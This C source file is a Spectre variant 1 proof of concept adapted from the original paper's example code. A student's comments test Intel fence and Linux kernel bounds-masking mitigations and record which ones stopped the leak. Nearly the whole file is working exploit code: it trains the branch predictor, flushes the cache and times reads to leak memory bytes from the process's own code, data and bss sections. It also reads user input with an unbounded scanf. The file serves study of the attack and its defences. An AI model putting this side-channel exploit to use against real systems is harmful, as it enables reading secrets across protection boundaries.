/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif /* ifdef _MSC_VER */

/* Automatically detect if SSE2 is not available when SSE is advertized */
#ifdef _MSC_VER
/* MSC */
#if _M_IX86_FP==1
#define NOSSE2
#endif
#else
/* Not MSC */
#if defined(__SSE__) && !defined(__SSE2__)
#define NOSSE2
#endif
#endif /* ifdef _MSC_VER */

#ifdef NOSSE2
#define NORDTSCP  // disable accurate timer
#define NOMFENCE  // disable memory fence
#define NOCLFLUSH // disable memory flush
#endif

// inited gose to data, uninited gose to bss
enum Mode {TEXT = 1, DATA = 2, BSS = 3};
enum Mode mode = BSS;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;

// added char a before data to make sure compiler reorder put this in lowest address
volatile uint8_t adata_base_data[33] = 
  {0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 
  0x74, 0x68, 0x65, 0x20, 0x62, 0x61, 0x73, 0x65, 
  0x20, 0x6F, 0x66, 0x20, 0x64, 0x61, 0x74, 0x61, 
  0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 
  0x00};
uint8_t array1[16] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};

// approx. base address of .text .data and .bss section
//volatile uint8_t* data_base = &adata_base_data;
volatile uint8_t* data_base = adata_base_data;
volatile uint8_t a[16];   // used trival name as a because compiler reorders them, 
                          // a is lowest
volatile uint8_t* bss_base = a;
volatile char* text_base = "this is the base of text -ish";

/////////////////////////////////////////////
/* victm can be placed anywhere below here */


char a_in[256];

uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The quick brown fox jumps over the lazy dog";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

#ifdef LINUX_KERNEL_MITIGATION
/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */

/*
    Shuai: The newest Linux Patch provided a secure way to 
    chcek array boundary without leaking side-channel info
*/

/**
 * array_index_mask_nospec() - generate a mask that is ~0UL when the
 * 	bounds check succeeds and 0 otherwise
 * @index: array element index
 * @size: number of elements in array
 *
 * Returns:
 *     0 - (index < size)
 */
static inline unsigned long array_index_mask_nospec(unsigned long index,
		unsigned long size)
{
	unsigned long mask;

	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
			:"=r" (mask)
			:"g"(size),"r" (index)
			:"cc");
	return mask;
}
#endif

void victim_function(size_t x) {
  if (x < array1_size) {
#ifdef INTEL_MITIGATION
		/*
		 * According to Intel et al, the best way to mitigate this is to 
		 * add a serializing instruction after the boundary check to force
		 * the retirement of previous instructions before proceeding to 
		 * the read.
		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
		 */

     /*
     Shuai: 
     TLDR intel proposes:
     1. urge developer add memory fence around sensitive data access (used in this case)
          pro: very litte overhead, very effective
          con: intel / amd have no cotrol on it
     2. flush the indirect branch predictor based on a time (used by 10+gen intel)
          pro: easy to implement
          con: performance hit scales to aggressivness of this policy (i don't think its implemented)
     3. thread based indirect branch predictor (add a "thread ID" field to BP)
          pro: easy-ish to implement
          con: rendering global BP useless
     4. delayed update to BP buffer (used by 10+gen intel)
          pro: very effective
          con: hard to implement, great performance hit to hard-to-predit case or small loops
     */
		_mm_lfence();
#endif
#ifdef LINUX_KERNEL_MITIGATION
    x &= array_index_mask_nospec(x, array1_size);
#endif
    temp &= array2[array1[x] * 512];
  }
}


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

#ifdef NOCLFLUSH
  int junk2 = 0;
  int l;
  (void)junk2;
#endif

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (j = 0; j < 16; j++)
      for (i = 0; i < 256; i++)
        flush_memory_sse( & array2[i * 512]);
#endif

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( & array1_size);
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */

      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif

      /* Delay (can also mfence) */
      for (volatile int z = 0; z < 100; z++) {}

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

    /*
    We need to accuratly measure the memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.

    The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */

#ifndef NORDTSCP
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else

    /*
    The rdtscp instruction was instroduced with the x86-64 extensions.
    Many older 32-bit processors won't support this, so we need to use
    the equivalent but non-serialized tdtsc instruction instead.
    */

#ifndef NOMFENCE
      /*
      Since the rdstc instruction isn't serialized, newer processors will try to
      reorder it, ruining its value as a timing mechanism.
      To get around this, we use the mfence instruction to introduce a memory
      barrier and force serialization. mfence is used because it is portable across
      Intel and AMD.
      */

      _mm_mfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_mfence();
      junk = * addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
#else
      /*
      The mfence instruction was introduced with the SSE2 instruction set, so
      we have to ifdef it out on pre-SSE2 processors.
      Luckily, these older processors don't seem to reorder the rdtsc instruction,
      so not having mfence on older processors is less of an issue.
      */

      time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
  const char * * argv) {
  
  /* Default to a cache hit threshold of 80 */
  int cache_hit_threshold = 80;

  /* Default for malicious_x is the secret string address */
  // size_t malicious_x = (size_t)(secret - (char * ) array1);
  size_t malicious_x;
  if (mode == TEXT) { // inspect the .text section
    malicious_x = (size_t)((char * ) text_base - (char * ) array1);
  } else if (mode == DATA){// inspect the .data section
    malicious_x = (size_t)((char * ) data_base - (char * ) array1);
  } else {
    malicious_x = (size_t)((char * ) bss_base - (char * ) array1);
  }
  printf("text base is   : %p\n", text_base);
  printf("secret base is : %p\n", secret);
  printf("data base is   : %p\n", data_base);
  printf("arr1 base is   : %p\n", array1);
  printf("bss base is    : %p\n", bss_base);
  printf("ui base is     : %p\n", a_in);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = 233;

  printf ("Enter your password: ");
  scanf ("%s", a_in);

  
  int score[2];
  uint8_t value[2];
  int i;

  #ifdef NOCLFLUSH
  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif
  
  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the cache_hit_threshold from the first command line argument.
     (OPTIONAL) */
  if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  /* Parse the malicious x address and length from the second and third
     command line argument. (OPTIONAL) */
  if (argc >= 4) {
    sscanf(argv[2], "%p", (void * * )( &malicious_x));

    /* Convert input value into a pointer */
    malicious_x -= (size_t) array1;

    sscanf(argv[3], "%d", &len);
  }

  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    printf("Version: commit " GIT_COMMIT_HASH "\n");
  #endif
  
  /* Print cache hit threshold */
  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
  
  /* Print build configuration */
  printf("Build: ");
  #ifndef NORDTSCP
    printf("RDTSCP_SUPPORTED ");
  #else
    printf("RDTSCP_NOT_SUPPORTED ");
  #endif
  #ifndef NOMFENCE
    printf("MFENCE_SUPPORTED ");
  #else
    printf("MFENCE_NOT_SUPPORTED ");
  #endif
  #ifndef NOCLFLUSH
    printf("CLFLUSH_SUPPORTED ");
  #else
    printf("CLFLUSH_NOT_SUPPORTED ");
  #endif
  #ifdef INTEL_MITIGATION
    printf("INTEL_MITIGATION_ENABLED ");
  #else
    printf("INTEL_MITIGATION_DISABLED ");
  #endif
  #ifdef LINUX_KERNEL_MITIGATION
    printf("LINUX_KERNEL_MITIGATION_ENABLED ");
  #else
    printf("LINUX_KERNEL_MITIGATION_DISABLED ");
  #endif

  printf("\n");

  printf("Reading %d bytes:\n", len);

  /* Start the read loop to read each address */
  while (--len >= 0) {

    /* Call readMemoryByte with the required cache hit threshold and
       malicious x address. value and score are arrays that are
       populated with the results.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

    if (value[0] > 31 && value[0] < 127) {
      /* Display the results */
      printf("Reading at malicious_x = %p... ", (void * ) (malicious_x - 1));
      printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
      printf("0x%02X=’%c’ score=%d ", value[0],
        (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
      
      if (score[1] > 0) {
        printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
        (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
      }
      printf("\n");
    }
  }
  return (0);
}

/*
Shuai:
Tested on Columbia ECE server
No protection: hack succeed

enable secure boundary check: hack failed

enable fence protection: hack failed

enable BP protection: return gibbrish with high confidence
                      means successfully read data, but from random location

disable accurate timer: required some fine-tuning on the parameters
                        but hack succeed

disable memory fence:   hack succeed

disable memory flush:   must manually load/store to flush
                        very slow hack, very slow parameter-tuning
                        I gave up, (not a fail, but not success either)
very old machine (pentium era):  same as above
*/
